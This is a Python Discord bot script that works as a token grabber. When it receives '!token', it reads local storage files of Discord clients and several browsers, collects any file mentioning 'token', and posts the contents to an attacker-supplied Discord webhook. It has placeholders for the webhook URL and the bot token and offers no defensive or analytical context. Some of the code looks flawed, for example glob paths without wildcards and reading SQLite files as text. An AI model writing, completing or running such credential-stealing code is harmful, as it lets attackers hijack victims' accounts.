import discord
import glob

client = discord.Client()

@client.event
async def on_message(message):
    if message.content.startswith('!token'):
        # Replace YOUR_DISCORD_WEBHOOK_URL with the URL of your Discord webhook
        webhook = discord.Webhook.from_url(url='YOUR_DISCORD_WEBHOOK_URL',
                                          adapter=discord.AsyncWebhookAdapter(client))

        # Search for authorization tokens in multiple directories
        directories = ['~/.config/discord/Local Storage/.localstorage',
                       '~/.config/discord-ptb/Local Storage/.localstorage',
                       '~/.config/discord-canary/Local Storage/.localstorage',
                       '~/.config/google-chrome/Default/Local Storage/.localstorage',
                       '~/.config/opera/Default/Local Storage/.localstorage',
                       '~/.config/brave/Local Storage/.localstorage',
                       '~/.mozilla/firefox/.default/storage/default/.sqlite',
                       '~/.config/yandex/Local Storage/.localstorage']

        tokens = []
        for directory in directories:
            files = glob.glob(directory, recursive=True)
            for file in files:
                with open(file, 'r') as f:
                    data = f.read()
                    if '"token"' in data:
                        tokens.append(data)

        # Send the tokens to the Discord webhook
        if tokens:
            await webhook.send(tokens)
        else:
            await webhook.send('No authorization tokens found.')

client.run('YOUR_DISCORD_BOT_TOKEN')
